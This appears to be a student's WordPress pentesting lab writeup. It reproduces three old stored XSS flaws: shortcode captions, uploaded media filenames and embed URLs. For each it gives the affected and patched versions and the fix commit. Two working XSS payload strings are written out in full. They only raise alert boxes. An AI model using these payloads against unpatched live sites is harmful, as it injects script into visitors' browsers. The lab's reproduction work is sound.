# Cybersecurity

# WP Pentesting

Hours: 10

All Gifs made with Peek

1. A small writeup indicating the steps you used to recreate
2. The types / classes of vulnerabilities involved and any related CVE identifiers
3. Identify affected versions and patches
4. Links to the source code, where possible
5. A screen cap


Vulnerability #1 - ShortCode Tags Cross-Site Scripting 
1. Walkthrough
a. Create a new post with the following text: 
```
HAXORED[caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(666)'">CHECK THIS OUT</a>
```
b. Publish post and put mouse cursor over the link.

2. XSS Vulnerability - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5714
3. Affected v4.1.1, Patched in 4.3.1
4. https://github.com/WordPress/WordPress/commit/f72b21af23da6b6d54208e5c1d65ececdaa109c8
5. See Peek1.gif


Vulnerability #2 - Stored XSS Vulnerability via uploaded media

1. Walkthrough
a Upload a image file with the name changed exploit a XSS vulnerability in the form of an attachment. This must be uploaded by the admin
b. Article is then published and made available
c. Attachment file is opened and XSS script is run via filename

2. XSS Vulnerability
3. Affected v4.2.2, Patched in v4.6.1
4. https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0
5. See Peek2.gif



Vulnerability #3 - URL Embed XSS Vulnerability

1. Walkthrough
a Create a new post with the following as text 
```[embed src='http://youtube.com/embed/mickeymouse\x3csvg onload=alert(666)\x3e'][/embed]```
b. Article is then published and made available
c. XSS is run as soon as page is loaded

2. XSS Vulnerability
3. Affected v4.1.1, Patched in v4.6.16
4. https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8
5. See Peek3.gif

